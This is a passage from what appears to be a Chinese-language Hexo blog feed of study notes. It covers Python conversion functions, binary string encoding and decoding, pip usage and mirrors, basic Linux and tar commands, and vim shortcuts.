class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int(x [,base ])         将x转换为一个整数    </span><br><span class="line">long(x [,base ])        将x转换为一个长整数    </span><br><span class="line"><span class="built_in">float</span>(x )               将x转换到一个浮点数    </span><br><span class="line">complex(real [,imag ])  创建一个复数    </span><br><span class="line">str(x )                 将对象 x 转换为字符串    </span><br><span class="line">repr(x )                将对象 x 转换为表达式字符串    </span><br><span class="line"><span class="built_in">eval</span>(str )              用来计算在字符串中的有效Python表达式,并返回一个对象    </span><br><span class="line">tuple(s )               将序列 s 转换为一个元组    </span><br><span class="line">list(s )                将序列 s 转换为一个列表    </span><br><span class="line">chr(x )                 将一个整数转换为一个字符    </span><br><span class="line">unichr(x )              将一个整数转换为Unicode字符    </span><br><span class="line">ord(x )                 将一个字符转换为它的整数值    </span><br><span class="line">hex(x )                 将一个整数转换为一个十六进制字符串    </span><br><span class="line">oct(x )                 将一个整数转换为一个八进制字符串</span><br></pre></td></tr></table></figure><h2 id="字符串和二进制的转换"><a href="#字符串和二进制的转换" class="headerlink" title="字符串和二进制的转换"></a>字符串和二进制的转换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def encode(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">' '</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">def decode(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 2) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br></pre></td></tr></table></figure><h3 id="8位二进制转换"><a href="#8位二进制转换" class="headerlink" title="8位二进制转换"></a>8位二进制转换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def decode(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 2) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br><span class="line">st=<span class="string">'011001100110110001100001011001110111101101100011011001010011001101100101001101010011000000110010011000110010110100110100001110000110001100111001001011010011010001100100001101010011000000101101001110010011100100111001001100000010110100110101011000100011100000110001011001000110001000110110011001100110001101100010011001100011000001111101'</span></span><br><span class="line">result=<span class="string">''</span></span><br><span class="line">a=0</span><br><span class="line">b=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> st:</span><br><span class="line">    a+=1</span><br><span class="line">    b+=i</span><br><span class="line">    <span class="keyword">if</span> a==8:</span><br><span class="line">        result+=decode(b)</span><br><span class="line">        b=<span class="string">''</span></span><br><span class="line">        a=0</span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><h2 id="join-和split-函数"><a href="#join-和split-函数" class="headerlink" title="join()和split()函数"></a>join()和split()函数</h2><p>Python中有join()和os.path.join()两个函数，具体作用如下：<br>    join()：    连接字符串数组。将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串<br>    os.path.join()：  将多个路径组合后返回<br>    1、join()函数</p><pre><code>语法：  &apos;sep&apos;.join(seq)参数说明sep：分隔符。可以为空seq：要连接的元素序列、字符串、元组、字典上面的语法即：以sep作为分隔符，将seq所有的元素合并成一个新的字符串返回值：返回一个以分隔符sep连接各个元素后生成的字符串2、os.path.join()函数语法：  os.path.join(path1[,path2[,......]])返回值：将多个路径组合后返回注：第一个绝对路径之前的参数将被忽略注：容器对象内的元素须为字符类型</code></pre><h3 id="join-示例"><a href="#join-示例" class="headerlink" title="join()示例"></a>join()示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#对序列进行操作（分别使用' '与':'作为分隔符）</span></span><br><span class="line">&gt;&gt;&gt; seq1 = [<span class="string">'hello'</span>,<span class="string">'good'</span>,<span class="string">'boy'</span>,<span class="string">'doiido'</span>]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">' '</span>.join(seq1)</span><br><span class="line">hello good boy doiido</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq1)</span><br><span class="line">hello:good:boy:doiido</span><br><span class="line"></span><br><span class="line"><span class="comment">#对字符串进行操作</span></span><br><span class="line">&gt;&gt;&gt; seq2 = <span class="string">"hello good boy doiido"</span></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq2)</span><br><span class="line">h:e:l:l:o: :g:o:o:d: :b:o:y: :d:o:i:i:d:o</span><br><span class="line"></span><br><span class="line"><span class="comment">#对元组进行操作</span></span><br><span class="line">&gt;&gt;&gt; seq3 = (<span class="string">'hello'</span>,<span class="string">'good'</span>,<span class="string">'boy'</span>,<span class="string">'doiido'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq3)</span><br><span class="line">hello:good:boy:doiido</span><br><span class="line"></span><br><span class="line"><span class="comment">#对字典进行操作:   dict是以Key值作连接, #dict 的无序性，使元素随机连接。set 同理</span></span><br><span class="line">&gt;&gt;&gt; seq4 = &#123;<span class="string">'hello'</span>:1,<span class="string">'good'</span>:2,<span class="string">'boy'</span>:3,<span class="string">'doiido'</span>:4&#125;</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq4)</span><br><span class="line">boy:good:doiido:hello</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并目录</span></span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.path.join(<span class="string">'hello'</span>,<span class="string">'goodboy'</span>,<span class="string">'doiido'</span>)</span><br><span class="line"><span class="string">'hello\goodboy\doiido'</span>   <span class="comment">#windows platform auto add \ between each string</span></span><br><span class="line"><span class="string">'hello/goodboy/doiido'</span>      <span class="comment">#linux platform auto add / between each string</span></span><br></pre></td></tr></table></figure><p>Python中有split()和os.path.split()两个函数，具体作用如下：<br>split()：拆分字符串。通过指定分隔符对字符串进行切片，并返回分割后的字符串列表（list）<br>os.path.split()：按照路径将文件名和路径分割开<br>Python中的spilt方法只能通过指定的某个字符分割字符串，如果需要指定多个字符，需要用到re模块里的split方法。<br>例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; a = <span class="string">"Hello world!How are you?My friend.Tom"</span></span><br><span class="line">&gt;&gt;&gt; re.split(<span class="string">" |!|\?|\."</span>, a)  </span><br><span class="line">[<span class="string">'Hello'</span>, <span class="string">'world'</span>, <span class="string">'How'</span>, <span class="string">'are'</span>, <span class="string">'you'</span>, <span class="string">'My'</span>, <span class="string">'friend'</span>, <span class="string">'Tom'</span>]</span><br></pre></td></tr></table></figure><h1 id="编码-1"><a href="#编码-1" class="headerlink" title="编码"></a>编码</h1><h2 id="1、查看文件编码方式"><a href="#1、查看文件编码方式" class="headerlink" title="1、查看文件编码方式"></a>1、查看文件编码方式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import chardet</span><br><span class="line">fobj=open(fname,<span class="string">'r'</span>)</span><br><span class="line">data=fobj.read()</span><br><span class="line"><span class="built_in">print</span> chardet.detect(data)[<span class="string">'encoding'</span>]</span><br></pre></td></tr></table></figure><h2 id="2、编码类型转换"><a href="#2、编码类型转换" class="headerlink" title="2、编码类型转换"></a>2、编码类型转换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python默认使用unicode字符集，默认编码方式utf-8.</span><br><span class="line">str.decode(<span class="string">'gbk'</span>)    <span class="comment">#将gbk编码的字符串转换成unicode编码</span></span><br><span class="line">str.encode(<span class="string">'gbk'</span>)    <span class="comment">#将unicode编码的字符串转换成gbk编码</span></span><br></pre></td></tr></table></figure><h1 id="pip库"><a href="#pip库" class="headerlink" title="pip库"></a>pip库</h1><h2 id="查看、升级pip版本、获取帮助"><a href="#查看、升级pip版本、获取帮助" class="headerlink" title="查看、升级pip版本、获取帮助"></a>查看、升级pip版本、获取帮助</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip --version</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip help</span><br></pre></td></tr></table></figure><h2 id="安装库"><a href="#安装库" class="headerlink" title="安装库"></a>安装库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install package_name</span><br><span class="line"><span class="comment"># 指定版本</span></span><br><span class="line">pip install package_name==<span class="number">1.1</span><span class="number">.2</span></span><br><span class="line"><span class="comment"># 批量安装</span></span><br><span class="line">pip install -r e:\\requirements.txt</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 使用wheel文件安装库</span></span><br><span class="line">pip install matplotlib‑<span class="number">3.4</span><span class="number">.1</span>‑cp39‑cp39‑win_amd64.whl</span><br></pre></td></tr></table></figure><h2 id="卸载和升级库"><a href="#卸载和升级库" class="headerlink" title="卸载和升级库"></a>卸载和升级库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip uninstall package_name</span><br><span class="line"></span><br><span class="line">pip install --upgrade package_name</span><br></pre></td></tr></table></figure><h2 id="查看库信息和已安装的库"><a href="#查看库信息和已安装的库" class="headerlink" title="查看库信息和已安装的库"></a>查看库信息和已安装的库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip show -f package_name</span><br><span class="line"><span class="comment"># 已安装的库</span></span><br><span class="line">pip list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看需要升级的库</span></span><br><span class="line">pip list -o</span><br></pre></td></tr></table></figure><h2 id="将库列表保存到指定文件中"><a href="#将库列表保存到指定文件中" class="headerlink" title="将库列表保存到指定文件中"></a>将库列表保存到指定文件中</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure><h2 id="检查兼容问题"><a href="#检查兼容问题" class="headerlink" title="检查兼容问题"></a>检查兼容问题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip check package-name</span><br></pre></td></tr></table></figure><h2 id="下载库到本地"><a href="#下载库到本地" class="headerlink" title="下载库到本地"></a>下载库到本地</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip download package_name -d <span class="string">"要保存的文件路径"</span></span><br></pre></td></tr></table></figure><h2 id="更换pip源"><a href="#更换pip源" class="headerlink" title="更换pip源"></a>更换pip源</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时使用</span></span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package matplotlib</span><br><span class="line"><span class="comment"># 设为默认</span></span><br><span class="line">pip config set <span class="keyword">global</span>.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h3 id="主流镜像源地址"><a href="#主流镜像源地址" class="headerlink" title="主流镜像源地址"></a>主流镜像源地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">清华：https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/ </span><br><span class="line"></span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ </span><br><span class="line"></span><br><span class="line">华中理工大学：http://pypi.hustunique.com/ </span><br><span class="line"></span><br><span class="line">山东理工大学：http://pypi.sdutlinux.org/ </span><br><span class="line"></span><br><span class="line">豆瓣：http://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux基础</title>
      <link href="/2018/08-15-Linux.html"/>
      <url>/2018/08-15-Linux.html</url>
      <content type="html"><![CDATA[<h1 id="Linux的基本概念"><a href="#Linux的基本概念" class="headerlink" title="Linux的基本概念"></a>Linux的基本概念</h1><h1 id="Linux的目录结构"><a href="#Linux的目录结构" class="headerlink" title="Linux的目录结构"></a>Linux的目录结构</h1><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1. 查看内存使用情况 - free [-bkmotV] [-s &lt;间隔秒数&gt;]</span><br><span class="line"></span><br><span class="line">2. 列出文件系统的整体磁盘使用量 - df [-ahikHTm] [目录或文件名]</span><br><span class="line"></span><br><span class="line">3. 对文件和目录磁盘使用的空间的查看 - du [-ahskm] [文件或目录名称]</span><br><span class="line"></span><br><span class="line">4. 根据端口查看进程 - lsof -i:(port)</span><br><span class="line"></span><br><span class="line">5. 根据进程名查看进程 - ps | grep (name)</span><br><span class="line"></span><br><span class="line">6. 查看共享内存情况 - ipcs</span><br><span class="line"></span><br><span class="line">7. 查看网络情况 - netstat</span><br><span class="line"></span><br><span class="line">8. 查看linux版本 - lsb_release -a</span><br><span class="line"></span><br><span class="line">9. 磁盘分区表操作工具 - fdisk</span><br><span class="line"></span><br><span class="line">10. 挂载磁盘 - mount</span><br><span class="line"></span><br><span class="line">11. 查看cpu使用情况 - top</span><br><span class="line"></span><br><span class="line">12. 查看cpu信息</span><br><span class="line"></span><br><span class="line">    ​cat /proc/cpuinfo</span><br><span class="line"></span><br><span class="line">    ​cat /proc/meminfo</span><br><span class="line"></span><br><span class="line">13. 查看硬盘信息</span><br><span class="line"></span><br><span class="line">    ​df -lh</span><br><span class="line"></span><br><span class="line">    更详细的信息</span><br><span class="line"></span><br><span class="line">    ​cat /proc/scsi/scsi</span><br><span class="line"></span><br><span class="line">14. 查看网卡信息</span><br><span class="line"></span><br><span class="line">    ​dmesg | grep eth</span><br><span class="line"></span><br><span class="line">    更常用的命令(显示系统核心版本号、名称、机器类型等)</span><br><span class="line"></span><br><span class="line">    ​uname -a</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ls                  用来显示目标列表</span><br><span class="line"><span class="built_in">cd</span> [path]           用来切换工作目录</span><br><span class="line"><span class="built_in">pwd</span>                 以绝对路径的方式显示用户当前工作目录</span><br><span class="line">man [<span class="built_in">command</span>]       查看Linux中的指令帮助、配置文件帮助和编程帮助等信息</span><br><span class="line">apropos [whatever]  在一些特定的包含系统命令的简短描述的数据库文件里查找关键字</span><br><span class="line"><span class="built_in">echo</span> [string]       打印一行文本，参数“-e”可激活转义字符</span><br><span class="line">cat [file]          连接文件并打印到标准输出设备上</span><br><span class="line">less [file]         允许用户向前或向后浏览文字档案的内容</span><br><span class="line">mv [file1] [file2]  用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中</span><br><span class="line">cp [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录</span><br><span class="line">rm [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉</span><br><span class="line">ps                  用于报告当前系统的进程状态</span><br><span class="line">top                 实时查看系统的整体运行情况</span><br><span class="line"><span class="built_in">kill</span>                杀死一个进程</span><br><span class="line">ifconfig            查看或设置网络设备</span><br><span class="line">ping                查看网络上的主机是否工作</span><br><span class="line">netstat             显示网络连接、路由表和网络接口信息</span><br><span class="line">nc(netcat)          建立</span><br><span class="line">TCP 和 UDP 连接并监听</span><br><span class="line">su                  切换当前用户身份到其他用户身份</span><br><span class="line">touch [file]        创建新的空文件</span><br><span class="line">mkdir [dir]         创建目录</span><br><span class="line">chmod               变更文件或目录的权限</span><br><span class="line">chown               变更某个文件或目录的所有者和所属组</span><br><span class="line">nano / vim / emacs  字符终端的文本编辑器</span><br><span class="line"><span class="built_in">exit</span>                退出</span><br><span class="line">shell</span><br><span class="line">管道命令符 <span class="string">"|"</span>       将一个命令的标准输出作为另一个命令的标准输入</span><br></pre></td></tr></table></figure><h2 id="解压缩命令"><a href="#解压缩命令" class="headerlink" title="解压缩命令"></a>解压缩命令</h2><p>linux下最常用的打包程序就是tar了，使用tar程序打出来的包我们常称为tar包，tar包文件的命令通常都是以.tar结尾的。生成tar包后，就可以用其它的程序来进行压缩。</p><h3 id="命令参数："><a href="#命令参数：" class="headerlink" title="命令参数："></a>命令参数：</h3><p>必要参数有如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-A 新增压缩文件到已存在的压缩</span><br><span class="line">-B 设置区块大小</span><br><span class="line">-c 建立新的压缩文件</span><br><span class="line">-d 记录文件的差别</span><br><span class="line">-r 添加文件到已经压缩的文件</span><br><span class="line">-u 添加改变了和现有的文件到已经存在的压缩文件</span><br><span class="line">-x 从压缩的文件中提取文件</span><br><span class="line">-t 显示压缩文件的内容</span><br><span class="line">-z 支持gzip解压文件</span><br><span class="line">-j 支持bzip2解压文件</span><br><span class="line">-Z 支持compress解压文件</span><br><span class="line">-v 显示操作过程</span><br><span class="line">-l 文件系统边界设置</span><br><span class="line">-k 保留原有文件不覆盖</span><br><span class="line">-m 保留文件不被覆盖</span><br><span class="line">-W 确认压缩文件的正确性</span><br><span class="line">可选参数如下：</span><br><span class="line">-b 设置区块数目</span><br><span class="line">-C 切换到指定目录（是相对路径）</span><br><span class="line">-f 指定压缩文件</span><br><span class="line">--<span class="built_in">help</span> 显示帮助信息</span><br><span class="line">--version 显示版本信息</span><br></pre></td></tr></table></figure><h3 id="常见解压-压缩命令"><a href="#常见解压-压缩命令" class="headerlink" title="常见解压/压缩命令"></a>常见解压/压缩命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">tar</span><br><span class="line">解包：tar xvf FileName.tar</span><br><span class="line">打包：tar cvf FileName.tar DirName</span><br><span class="line">（注：tar是打包，不是压缩！）</span><br><span class="line">.gz</span><br><span class="line">解压1：gunzip FileName.gz</span><br><span class="line">解压2：gzip -d FileName.gz</span><br><span class="line">压缩：gzip FileName</span><br><span class="line">.tar.gz 和 .tgz</span><br><span class="line">解压：tar zxvf FileName.tar.gz</span><br><span class="line">压缩：tar zcvf FileName.tar.gz DirName</span><br><span class="line">.bz2</span><br><span class="line">解压1：bzip2 -d FileName.bz2</span><br><span class="line">解压2：bunzip2 FileName.bz2</span><br><span class="line">压缩： bzip2 -z FileName</span><br><span class="line">.tar.bz2</span><br><span class="line">解压：tar jxvf FileName.tar.bz2</span><br><span class="line">压缩：tar jcvf FileName.tar.bz2 DirName</span><br><span class="line">.bz</span><br><span class="line">解压1：bzip2 -d FileName.bz</span><br><span class="line">解压2：bunzip2 FileName.bz</span><br><span class="line">压缩：未知</span><br><span class="line">.tar.bz</span><br><span class="line">解压：tar jxvf FileName.tar.bz</span><br><span class="line">压缩：未知</span><br><span class="line">.Z</span><br><span class="line">解压：uncompress FileName.Z</span><br><span class="line">压缩：compress FileName</span><br><span class="line">.tar.Z</span><br><span class="line">解压：tar Zxvf FileName.tar.Z</span><br><span class="line">压缩：tar Zcvf FileName.tar.Z DirName</span><br><span class="line">.zip</span><br><span class="line">解压：unzip FileName.zip</span><br><span class="line">压缩：zip FileName.zip DirName</span><br><span class="line">.rar</span><br><span class="line">解压：rar x FileName.rar</span><br><span class="line">压缩：rar a FileName.rar DirName</span><br></pre></td></tr></table></figure><h3 id="5．使用实例"><a href="#5．使用实例" class="headerlink" title="5．使用实例"></a>5．使用实例</h3><p>实例1：将文件全部打包成tar包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf log.tar log2012.log</span><br><span class="line">tar -zcvf log.tar.gz log2012.log</span><br><span class="line">tar -jcvf log.tar.bz2 log2012.log</span><br></pre></td></tr></table></figure><h2 id="Bash-快捷键"><a href="#Bash-快捷键" class="headerlink" title="Bash 快捷键"></a>Bash 快捷键</h2><pre><code>Up(Down)          上（下）一条指令Ctrl + c          终止当前进程Ctrl + z          挂起当前进程，使用“fg”可唤醒Ctrl + d          删除光标处的字符Ctrl + l          清屏Ctrl + a          移动到命令行首Ctrl + e          移动到命令行尾Ctrl + b          按单词后移（向左）Ctrl + f          按单词前移（向右）Ctrl + Shift + c  复制Ctrl + Shift + v  粘贴</code></pre><h1 id="Linux的文本编辑器"><a href="#Linux的文本编辑器" class="headerlink" title="Linux的文本编辑器"></a>Linux的文本编辑器</h1><h2 id="打开命令"><a href="#打开命令" class="headerlink" title="打开命令"></a>打开命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi filename</span><br></pre></td></tr></table></figure><h2 id="退出命令"><a href="#退出命令" class="headerlink" title="退出命令"></a>退出命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">：q   退出而且不保存修改的内容</span><br><span class="line"></span><br><span class="line">：q! 强制退出不保存修改的内容</span><br><span class="line"></span><br><span class="line">：wq 退出并且保存修改的内容</span><br><span class="line"></span><br><span class="line">：wq! 强制保存修改的内容然后退出（修改了只读文件会用到）</span><br><span class="line"></span><br><span class="line">：ZZ  退出并且保存修改的内容，相当于：wq</span><br></pre></td></tr></table></figure><h2 id="光标移动命令"><a href="#光标移动命令" class="headerlink" title="光标移动命令"></a>光标移动命令</h2><p>上下左右方向键，字母 h (左) ，j (下)， k(上)，l(右)也是可以的</p><p>^ 光标移到行首</p><p>$ 光标移到行尾</p><p>shift+g 光标移动到文件最后一行</p><p>gg 光标移动到文件第一行</p><h2 id="控制命令"><a href="#控制命令" class="headerlink" title="控制命令"></a>控制命令</h2><p>Ctrl+d   向下滚半屏</p><p>Ctrl+u   向上滚半屏</p><p>Ctrl+f    向下滚全屏</p><p>Ctrl+b   向上滚全屏</p><h2 id="编辑命令"><a href="#编辑命令" class="headerlink" title="编辑命令"></a>编辑命令</h2><p>主要是进入编辑状态，也就是insert状态</p><p>i 光标当前位置开始编辑</p><p>o 光标的下一行开始编辑</p><p>shift+o 光标的上一行开始编辑</p><h2 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h2><p>dd  删除一行，可以带个数字，如6dd，表示向下删除6行</p><p>d$  删除光标到行尾的内容（也可以使用ctrl+d）</p><p>d^  删除光标到行首的内容</p><p>x    删除光标位置的字符（向后删除）</p><p>shift+x   删除光标位置的字符（向前删除）</p><h2 id="替换命令"><a href="#替换命令" class="headerlink" title="替换命令"></a>替换命令</h2><p>r  按esc退出insert状态再按个r,然后再输入一个字符，将会替换光标位置的字符</p><p>R 跟r一样，只不过是可以替换多个字符</p><p>：s/aa/bb/g    替换当前行的所有aa将会变成bb</p><p>：%s/aa/bb/g  替换整个文件的,所有aa将会变成bb</p><p>：n1,n2s/aa/bb/g  替换n1到n2行之间所有的aa变成bb</p><h2 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h2><p>/String 查找一个字符串（向下开始）</p><p>？String 查找一个字符串（向上开始）</p><p>n  向后查找下一个 </p><p>shift+n  向前查找下一个</p><h2 id="粘贴复制命令"><a href="#粘贴复制命令" class="headerlink" title="粘贴复制命令"></a>粘贴复制命令</h2><p>yw 复制一个单词</p><p>yy  复制一行，和删除dd一样可以带个数字，6yy复制六行（向下复制6行）</p><p>p   粘贴到光标位置的下一行</p><p>shift+p  粘贴到光标位置的上一行</p><h2 id="同时打开两个文件"><a href="#同时打开两个文件" class="headerlink" title="同时打开两个文件"></a>同时打开两个文件</h2><p>比如：aa.txt  ss.txt</p><p>打开第一个文件vi aa.txt然后输入下面的命令</p><p>：sp ss.txt       此时就在同一个窗口打开另外一个ss.txt </p><p> 